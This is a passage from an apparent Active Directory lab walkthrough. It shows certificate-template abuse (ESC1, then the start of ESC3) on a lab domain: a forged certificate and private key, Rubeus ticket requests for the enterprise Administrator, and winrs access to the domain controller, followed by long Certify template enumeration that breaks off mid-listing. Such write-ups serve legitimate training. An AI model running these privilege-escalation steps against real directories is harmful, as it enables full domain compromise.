wIYKAmshZTiFrb8avkZqfp8eMG/vp0Y6ReGfT15D8yq1MoMzTb+DkWbUAIiLS8ka
qy1PjeagtFpR6gZaSHJQrnMnAoGAREHH922NrfScWNuI+vNYhKhgbetXdbUkoFj9
5/KA/BX6itcqCwbYFFGLuUhgC4psAos73s18DeTufjC++6gOC4VBZ2oHWSCctQRY
RuVhO0e9mZgMeo5BaQWo+6+0rtFXMAtNtFRkJHqOK+vLoJObPg3vlC/T67Pcwdby
9S7l5qkCgYBUpwG8ENGpDXW5Uq7m9UXtdOiFRz+a7ZAe4QLIhNNs+PKCELeYTLNO
PRapuXfnApkNHx5088WzKVhdGDse92/+VNwlDBMtGDilGkt/4QTeRyntlt4pPmEE
BZFhhzdNZcrFyHHSODwEnj0JWq9+c760Tqkyp1sZsKp0gvxGD+PWrQ==
-----END RSA PRIVATE KEY-----
-----BEGIN CERTIFICATE-----
MIIGcjCCBVqgAwIBAgITFQAAACNnQDVvpqyyjQAAAAAAIzANBgkqhkiG9w0BAQsF
ADBSMRUwEwYKCZImiZPyLGQBGRYFbG9jYWwxGTAXBgoJkiaJk/IsZAEZFgltb25l
eWNvcnAxHjAcBgNVBAMTFW1vbmV5Y29ycC1NQ09SUC1EQy1DQTAeFw0yNTA5MzAw
MDQ0MDVaFw0yNzA5MzAwMDU0MDVaMHMxFTATBgoJkiaJk/IsZAEZFgVsb2NhbDEZ
MBcGCgmSJomT8ixkARkWCW1vbmV5Y29ycDEaMBgGCgmSJomT8ixkARkWCmRvbGxh
cmNvcnAxDjAMBgNVBAMTBVVzZXJzMRMwEQYDVQQDEwpzdHVkZW50NzMxMIIBIjAN
BgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAwuFVC9GjEmKKHCbqGEmYAvAB2H5p
YjkSDZeh5IKMBaSHzszxeicYWCpWvm0vyIWr2tWN5sIE5ptrYqGN6zhoP8PpC02F
yXso1I/vDc+JiEqZTOKmUfnyrClktHUE6REk/oME8kouD0DhlZB8qA3Vp+gDG9JF
G+SKkuwEeWN93mejCRIvPuCdU51YkNrQ8UE1SFGQigzTUVo5Np81+dP0PpsnS2Eq
xcI6l4qJPx347RjARaBof80NzkcGjjw+/zapKzIHae6SfNlHa1nzwBNqxLP2jTKn
P84VUtXrWRuwTX5YTXrs83+MJn/L8J1nBEs7/2CQAq16aghrHvXgl5k1YQIDAQAB
o4IDHjCCAxowPQYJKwYBBAGCNxUHBDAwLgYmKwYBBAGCNxUIheGocofMn2jhhyaC
n65RgvL2fYE/hpePdoe0hBICAWQCAQYwKQYDVR0lBCIwIAYIKwYBBQUHAwIGCCsG
AQUFBwMEBgorBgEEAYI3CgMEMA4GA1UdDwEB/wQEAwIFoDA1BgkrBgEEAYI3FQoE
KDAmMAoGCCsGAQUFBwMCMAoGCCsGAQUFBwMEMAwGCisGAQQBgjcKAwQwRAYJKoZI
hvcNAQkPBDcwNTAOBggqhkiG9w0DAgICAIAwDgYIKoZIhvcNAwQCAgCAMAcGBSsO
AwIHMAoGCCqGSIb3DQMHMB0GA1UdDgQWBBSC08Pnx/PE1Fd86HyCnFbpH34eZzA4
BgNVHREEMTAvoC0GCisGAQQBgjcUAgOgHwwdbW9uZXljb3JwLmxvY2FsXGFkbWlu
aXN0cmF0b3IwHwYDVR0jBBgwFoAU0f6NCqf6tDKfNvwguPfLnmjFRe0wgdgGA1Ud
HwSB0DCBzTCByqCBx6CBxIaBwWxkYXA6Ly8vQ049bW9uZXljb3JwLU1DT1JQLURD
LUNBLENOPW1jb3JwLWRjLENOPUNEUCxDTj1QdWJsaWMlMjBLZXklMjBTZXJ2aWNl
cyxDTj1TZXJ2aWNlcyxDTj1Db25maWd1cmF0aW9uLERDPW1vbmV5Y29ycCxEQz1s
b2NhbD9jZXJ0aWZpY2F0ZVJldm9jYXRpb25MaXN0P2Jhc2U/b2JqZWN0Q2xhc3M9
Y1JMRGlzdHJpYnV0aW9uUG9pbnQwgcsGCCsGAQUFBwEBBIG+MIG7MIG4BggrBgEF
BQcwAoaBq2xkYXA6Ly8vQ049bW9uZXljb3JwLU1DT1JQLURDLUNBLENOPUFJQSxD
Tj1QdWJsaWMlMjBLZXklMjBTZXJ2aWNlcyxDTj1TZXJ2aWNlcyxDTj1Db25maWd1
cmF0aW9uLERDPW1vbmV5Y29ycCxEQz1sb2NhbD9jQUNlcnRpZmljYXRlP2Jhc2U/
b2JqZWN0Q2xhc3M9Y2VydGlmaWNhdGlvbkF1dGhvcml0eTANBgkqhkiG9w0BAQsF
AAOCAQEA0kDYBKTW6aR0pU0ja/osPBRntct1wkNtgh2Evyd5tVe4L+yfs8zNr+7b
0RwW1oP7EaQ+avRNLyuO7rs8Nu1B4wXUj4GR5hnS9OkZzTz3ZkLtVpxq5imGeppd
s1xomOQXpxUp+3RpDtzBKvdTnV4RCrBFCIk4sQbnLZFU5MWiVxgiZvTSxnhpE2eQ
IObJ5UnSX5vvyyKoG/36PxUZ8W1e4WFtfoR+qugf+dKGT+0i0cq6uHkuWoeeCfIQ
VJgt3+gzVd7i3OBbrZ7igP0dQyaMST2JvqcDAbwJy1dE9mMZx4myg/ogfuZOKwSe
FjBZ3dCjdvb5WWxWfhEEjfnik8N73g==
-----END CERTIFICATE-----


[*] Convert with: openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx

Certify completed in 00:00:05.0649105
```

Save the certificate to esc1-EA.pem and convert it to PFX. I will use SecretPass@123 as the export 
password

* C:\AD\Tools> C:\AD\Tools\openssl\openssl.exe pkcs12 -in C:\AD\Tools\esc1-EA.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out C:\AD\Tools\esc1-EA.pfx
```
WARNING: can't open config file: /usr/local/ssl/openssl.cnf
Enter Export Password:
Verifying - Enter Export Password:
unable to write 'random state'
```

Use Rubeus to request TGT for Enterprise Administrator - Administrator

* C:\AD\Tools> C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:moneycorp.local\Administrator /dc:mcorp-dc,moneycorp.local /certificate:esc1-EA.pfx /password:SecretPass@123 /ptt

Finally, access mcorp-dc

* C:\AD\Tools>winrs -r:mcorp-dc cmd /c set username
```
USERNAME=administrator
```

### Privilege Escalation to DA and EA using ESC3

If we list vulnerable templates in moneycorp, we get the following result

C:\AD\Tools> C:\AD\Tools\Certify.exe find /vulnerable

```

   _____          _   _  __
  / ____|        | | (_)/ _|
 | |     ___ _ __| |_ _| |_ _   _
 | |    / _ \ '__| __| |  _| | | |
 | |___|  __/ |  | |_| | | | |_| |
  \_____\___|_|   \__|_|_|  \__, |
                             __/ |
                            |___./
  v1.1.0

[*] Action: Find certificate templates
[*] Using the search base 'CN=Configuration,DC=moneycorp,DC=local'

[*] Listing info about the Enterprise CA 'moneycorp-MCORP-DC-CA'

    Enterprise CA Name            : moneycorp-MCORP-DC-CA
    DNS Hostname                  : mcorp-dc.moneycorp.local
    FullName                      : mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA
    Flags                         : SUPPORTS_NT_AUTHENTICATION, CA_SERVERTYPE_ADVANCED
    Cert SubjectName              : CN=moneycorp-MCORP-DC-CA, DC=moneycorp, DC=local
    Cert Thumbprint               : 8DA9C3EF73450A29BEB2C77177A5B02D912F7EA8
    Cert Serial                   : 48D51C5ED50124AF43DB7A448BF68C49
    Cert Start Date               : 11/26/2022 1:59:16 AM
    Cert End Date                 : 11/26/2032 2:09:15 AM
    Cert Chain                    : CN=moneycorp-MCORP-DC-CA,DC=moneycorp,DC=local
    [!] UserSpecifiedSAN : EDITF_ATTRIBUTESUBJECTALTNAME2 set, enrollees can specify Subject Alternative Names!
    CA Permissions                :
      Owner: BUILTIN\Administrators        S-1-5-32-544

      Access Rights                                     Principal

      Allow  Enroll                                     NT AUTHORITY\Authenticated UsersS-1-5-11
      Allow  ManageCA, ManageCertificates               BUILTIN\Administrators        S-1-5-32-544
      Allow  ManageCA, ManageCertificates               mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
      Allow  ManageCA, ManageCertificates               mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
    Enrollment Agent Restrictions : None

[!] Vulnerable Certificates Templates :

    CA Name                               : mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA
    Template Name                         : SmartCardEnrollment-Agent
    Schema Version                        : 2
    Validity Period                       : 10 years
    Renewal Period                        : 6 weeks
    msPKI-Certificate-Name-Flag          : SUBJECT_ALT_REQUIRE_UPN, SUBJECT_REQUIRE_DIRECTORY_PATH
    mspki-enrollment-flag                 : AUTO_ENROLLMENT
    Authorized Signatures Required        : 0
    pkiextendedkeyusage                   : Certificate Request Agent
    mspki-certificate-application-policy  : Certificate Request Agent
    Permissions
      Enrollment Permissions
        Enrollment Rights           : dcorp\Domain Users            S-1-5-21-719815819-3726368948-3917688648-513
                                      mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
      Object Control Permissions
        Owner                       : mcorp\Administrator           S-1-5-21-335606122-960912869-3279953914-500
        WriteOwner Principals       : mcorp\Administrator           S-1-5-21-335606122-960912869-3279953914-500
                                      mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
        WriteDacl Principals        : mcorp\Administrator           S-1-5-21-335606122-960912869-3279953914-500
                                      mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
        WriteProperty Principals    : mcorp\Administrator           S-1-5-21-335606122-960912869-3279953914-500
                                      mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
Certify completed in 00:00:16.3286459
```

The "SmartCardEnrollment-Agent" template has EKU for Certificate Request Agent and grants 
enrollment rights to Domain users. If we can find another template that has an EKU that allows for 
domain authentication and has application policy requirement of certificate request agent, we can 
request certificate on behalf of any user.

* C:\AD\Tools>C:\AD\Tools\Certify.exe find
```

   _____          _   _  __
  / ____|        | | (_)/ _|
 | |     ___ _ __| |_ _| |_ _   _
 | |    / _ \ '__| __| |  _| | | |
 | |___|  __/ |  | |_| | | | |_| |
  \_____\___|_|   \__|_|_|  \__, |
                             __/ |
                            |___./
  v1.1.0

[*] Action: Find certificate templates
[*] Using the search base 'CN=Configuration,DC=moneycorp,DC=local'

[*] Listing info about the Enterprise CA 'moneycorp-MCORP-DC-CA'

    Enterprise CA Name            : moneycorp-MCORP-DC-CA
    DNS Hostname                  : mcorp-dc.moneycorp.local
    FullName                      : mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA
    Flags                         : SUPPORTS_NT_AUTHENTICATION, CA_SERVERTYPE_ADVANCED
    Cert SubjectName              : CN=moneycorp-MCORP-DC-CA, DC=moneycorp, DC=local
    Cert Thumbprint               : 8DA9C3EF73450A29BEB2C77177A5B02D912F7EA8
    Cert Serial                   : 48D51C5ED50124AF43DB7A448BF68C49
    Cert Start Date               : 11/26/2022 1:59:16 AM
    Cert End Date                 : 11/26/2032 2:09:15 AM
    Cert Chain                    : CN=moneycorp-MCORP-DC-CA,DC=moneycorp,DC=local
    [!] UserSpecifiedSAN : EDITF_ATTRIBUTESUBJECTALTNAME2 set, enrollees can specify Subject Alternative Names!
    CA Permissions                :
      Owner: BUILTIN\Administrators        S-1-5-32-544

      Access Rights                                     Principal

      Allow  Enroll                                     NT AUTHORITY\Authenticated UsersS-1-5-11
      Allow  ManageCA, ManageCertificates               BUILTIN\Administrators        S-1-5-32-544
      Allow  ManageCA, ManageCertificates               mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
      Allow  ManageCA, ManageCertificates               mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
    Enrollment Agent Restrictions : None

[*] Available Certificates Templates :

    CA Name                               : mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA
    Template Name                         : User
    Schema Version                        : 1
    Validity Period                       : 1 year
    Renewal Period                        : 6 weeks
    msPKI-Certificate-Name-Flag          : SUBJECT_ALT_REQUIRE_UPN, SUBJECT_ALT_REQUIRE_EMAIL, SUBJECT_REQUIRE_EMAIL, SUBJECT_REQUIRE_DIRECTORY_PATH
    mspki-enrollment-flag                 : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS, AUTO_ENROLLMENT
    Authorized Signatures Required        : 0
    pkiextendedkeyusage                   : Client Authentication, Encrypting File System, Secure Email
    mspki-certificate-application-policy  : <null>
    Permissions
      Enrollment Permissions
        Enrollment Rights           : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Domain Users            S-1-5-21-335606122-960912869-3279953914-513
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
      Object Control Permissions
        Owner                       : mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
        WriteOwner Principals       : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
        WriteDacl Principals        : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
        WriteProperty Principals    : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519

    CA Name                               : mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA
    Template Name                         : EFS
    Schema Version                        : 1
    Validity Period                       : 1 year
    Renewal Period                        : 6 weeks
    msPKI-Certificate-Name-Flag          : SUBJECT_ALT_REQUIRE_UPN, SUBJECT_REQUIRE_DIRECTORY_PATH
    mspki-enrollment-flag                 : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS, AUTO_ENROLLMENT
    Authorized Signatures Required        : 0
    pkiextendedkeyusage                   : Encrypting File System
    mspki-certificate-application-policy  : <null>
    Permissions
      Enrollment Permissions
        Enrollment Rights           : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Domain Users            S-1-5-21-335606122-960912869-3279953914-513
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
      Object Control Permissions
        Owner                       : mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
        WriteOwner Principals       : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
        WriteDacl Principals        : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
        WriteProperty Principals    : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519

    CA Name                               : mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA
    Template Name                         : Administrator
    Schema Version                        : 1
    Validity Period                       : 1 year
    Renewal Period                        : 6 weeks
    msPKI-Certificate-Name-Flag          : SUBJECT_ALT_REQUIRE_UPN, SUBJECT_ALT_REQUIRE_EMAIL, SUBJECT_REQUIRE_EMAIL, SUBJECT_REQUIRE_DIRECTORY_PATH
    mspki-enrollment-flag                 : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS, AUTO_ENROLLMENT
    Authorized Signatures Required        : 0
    pkiextendedkeyusage                   : Client Authentication, Encrypting File System, Microsoft Trust List Signing, Secure Email
    mspki-certificate-application-policy  : <null>
    Permissions
      Enrollment Permissions
        Enrollment Rights           : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
      Object Control Permissions
        Owner                       : mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
        WriteOwner Principals       : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
        WriteDacl Principals        : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
        WriteProperty Principals    : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519

    CA Name                               : mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA
    Template Name                         : EFSRecovery
    Schema Version                        : 1
    Validity Period                       : 5 years
    Renewal Period                        : 6 weeks
    msPKI-Certificate-Name-Flag          : SUBJECT_ALT_REQUIRE_UPN, SUBJECT_REQUIRE_DIRECTORY_PATH
    mspki-enrollment-flag                 : INCLUDE_SYMMETRIC_ALGORITHMS, AUTO_ENROLLMENT
    Authorized Signatures Required        : 0
    pkiextendedkeyusage                   : File Recovery
    mspki-certificate-application-policy  : <null>
    Permissions
      Enrollment Permissions
        Enrollment Rights           : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
      Object Control Permissions
        Owner                       : mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
        WriteOwner Principals       : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
        WriteDacl Principals        : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
        WriteProperty Principals    : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519

    CA Name                               : mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA
    Template Name                         : Machine
    Schema Version                        : 1
    Validity Period                       : 1 year
    Renewal Period                        : 6 weeks
    msPKI-Certificate-Name-Flag          : SUBJECT_ALT_REQUIRE_DNS, SUBJECT_REQUIRE_DNS_AS_CN
    mspki-enrollment-flag                 : AUTO_ENROLLMENT
    Authorized Signatures Required        : 0
    pkiextendedkeyusage                   : Client Authentication, Server Authentication
    mspki-certificate-application-policy  : <null>
    Permissions
      Enrollment Permissions
        Enrollment Rights           : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Domain Computers        S-1-5-21-335606122-960912869-3279953914-515
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
      Object Control Permissions
        Owner                       : mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
        WriteOwner Principals       : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
        WriteDacl Principals        : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
        WriteProperty Principals    : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519

    CA Name                               : mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA
    Template Name                         : DomainController
    Schema Version                        : 1
    Validity Period                       : 1 year
    Renewal Period                        : 6 weeks
    msPKI-Certificate-Name-Flag          : SUBJECT_ALT_REQUIRE_DIRECTORY_GUID, SUBJECT_ALT_REQUIRE_DNS, SUBJECT_REQUIRE_DNS_AS_CN
    mspki-enrollment-flag                 : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS, AUTO_ENROLLMENT
    Authorized Signatures Required        : 0
    pkiextendedkeyusage                   : Client Authentication, Server Authentication
    mspki-certificate-application-policy  : <null>
    Permissions
      Enrollment Permissions
        Enrollment Rights           : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Domain Controllers      S-1-5-21-335606122-960912869-3279953914-516
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
                                      mcorp\Enterprise Read-only Domain ControllersS-1-5-21-335606122-960912869-3279953914-498
                                      NT AUTHORITY\ENTERPRISE DOMAIN CONTROLLERSS-1-5-9
      Object Control Permissions
        Owner                       : mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
        WriteOwner Principals       : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
        WriteDacl Principals        : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
        WriteProperty Principals    : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519

    CA Name                               : mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA
    Template Name                         : WebServer
    Schema Version                        : 1
    Validity Period                       : 2 years
    Renewal Period                        : 6 weeks
    msPKI-Certificate-Name-Flag          : ENROLLEE_SUPPLIES_SUBJECT
    mspki-enrollment-flag                 : NONE
    Authorized Signatures Required        : 0
    pkiextendedkeyusage                   : Server Authentication
    mspki-certificate-application-policy  : <null>
    Permissions
      Enrollment Permissions
        Enrollment Rights           : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
      Object Control Permissions
        Owner                       : mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
        WriteOwner Principals       : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
        WriteDacl Principals        : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
        WriteProperty Principals    : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519

    CA Name                               : mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA
    Template Name                         : SubCA
    Schema Version                        : 1
    Validity Period                       : 5 years
    Renewal Period                        : 6 weeks
    msPKI-Certificate-Name-Flag          : ENROLLEE_SUPPLIES_SUBJECT
    mspki-enrollment-flag                 : NONE
    Authorized Signatures Required        : 0
    pkiextendedkeyusage                   : <null>
    mspki-certificate-application-policy  : <null>
    Permissions
      Enrollment Permissions
        Enrollment Rights           : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
      Object Control Permissions
        Owner                       : mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
        WriteOwner Principals       : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
        WriteDacl Principals        : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
        WriteProperty Principals    : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519

    CA Name                               : mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA
    Template Name                         : DomainControllerAuthentication
    Schema Version                        : 2
    Validity Period                       : 1 year
    Renewal Period                        : 6 weeks
    msPKI-Certificate-Name-Flag          : SUBJECT_ALT_REQUIRE_DNS
    mspki-enrollment-flag                 : AUTO_ENROLLMENT
    Authorized Signatures Required        : 0
    pkiextendedkeyusage                   : Client Authentication, Server Authentication, Smart Card Logon
    mspki-certificate-application-policy  : Client Authentication, Server Authentication, Smart Card Logon
    Permissions
      Enrollment Permissions
        Enrollment Rights           : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Domain Controllers      S-1-5-21-335606122-960912869-3279953914-516
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
                                      mcorp\Enterprise Read-only Domain ControllersS-1-5-21-335606122-960912869-3279953914-498
                                      NT AUTHORITY\ENTERPRISE DOMAIN CONTROLLERSS-1-5-9
      Object Control Permissions
        Owner                       : mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
        WriteOwner Principals       : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
        WriteDacl Principals        : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
        WriteProperty Principals    : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519

    CA Name                               : mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA
    Template Name                         : DirectoryEmailReplication
    Schema Version                        : 2
    Validity Period                       : 1 year
    Renewal Period                        : 6 weeks
    msPKI-Certificate-Name-Flag          : SUBJECT_ALT_REQUIRE_DIRECTORY_GUID, SUBJECT_ALT_REQUIRE_DNS
    mspki-enrollment-flag                 : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS, AUTO_ENROLLMENT
    Authorized Signatures Required        : 0
    pkiextendedkeyusage                   : Directory Service Email Replication
    mspki-certificate-application-policy  : Directory Service Email Replication
    Permissions
      Enrollment Permissions
        Enrollment Rights           : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Domain Controllers      S-1-5-21-335606122-960912869-3279953914-516
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
                                      mcorp\Enterprise Read-only Domain ControllersS-1-5-21-335606122-960912869-3279953914-498
                                      NT AUTHORITY\ENTERPRISE DOMAIN CONTROLLERSS-1-5-9
      Object Control Permissions
        Owner                       : mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
        WriteOwner Principals       : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
        WriteDacl Principals        : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
        WriteProperty Principals    : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519

    CA Name                               : mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA
    Template Name                         : KerberosAuthentication
    Schema Version                        : 2
    Validity Period                       : 1 year
    Renewal Period                        : 6 weeks
    msPKI-Certificate-Name-Flag          : SUBJECT_ALT_REQUIRE_DOMAIN_DNS, SUBJECT_ALT_REQUIRE_DNS
    mspki-enrollment-flag                 : AUTO_ENROLLMENT
    Authorized Signatures Required        : 0
    pkiextendedkeyusage                   : Client Authentication, KDC Authentication, Server Authentication, Smart Card Logon
    mspki-certificate-application-policy  : Client Authentication, KDC Authentication, Server Authentication, Smart Card Logon
    Permissions
      Enrollment Permissions
        Enrollment Rights           : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Domain Controllers      S-1-5-21-335606122-960912869-3279953914-516
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
                                      mcorp\Enterprise Read-only Domain ControllersS-1-5-21-335606122-960912869-3279953914-498
                                      NT AUTHORITY\ENTERPRISE DOMAIN CONTROLLERSS-1-5-9
      Object Control Permissions
        Owner                       : mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
        WriteOwner Principals       : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
        WriteDacl Principals        : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
        WriteProperty Principals    : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519

    CA Name                               : mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA
    Template Name                         : SmartCardEnrollment-Agent
    Schema Version                        : 2
    Validity Period                       : 10 years
    Renewal Period                        : 6 weeks
    msPKI-Certificate-Name-Flag          : SUBJECT_ALT_REQUIRE_UPN, SUBJECT_REQUIRE_DIRECTORY_PATH
    mspki-enrollment-flag                 : AUTO_ENROLLMENT
    Authorized Signatures Required        : 0
    pkiextendedkeyusage                   : Certificate Request Agent
    mspki-certificate-application-policy  : Certificate Request Agent
    Permissions
      Enrollment Permissions
        Enrollment Rights           : dcorp\Domain Users            S-1-5-21-719815819-3726368948-3917688648-513
                                      mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
      Object Control Permissions
        Owner                       : mcorp\Administrator           S-1-5-21-335606122-960912869-3279953914-500
        WriteOwner Principals       : mcorp\Administrator           S-1-5-21-335606122-960912869-3279953914-500
                                      mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
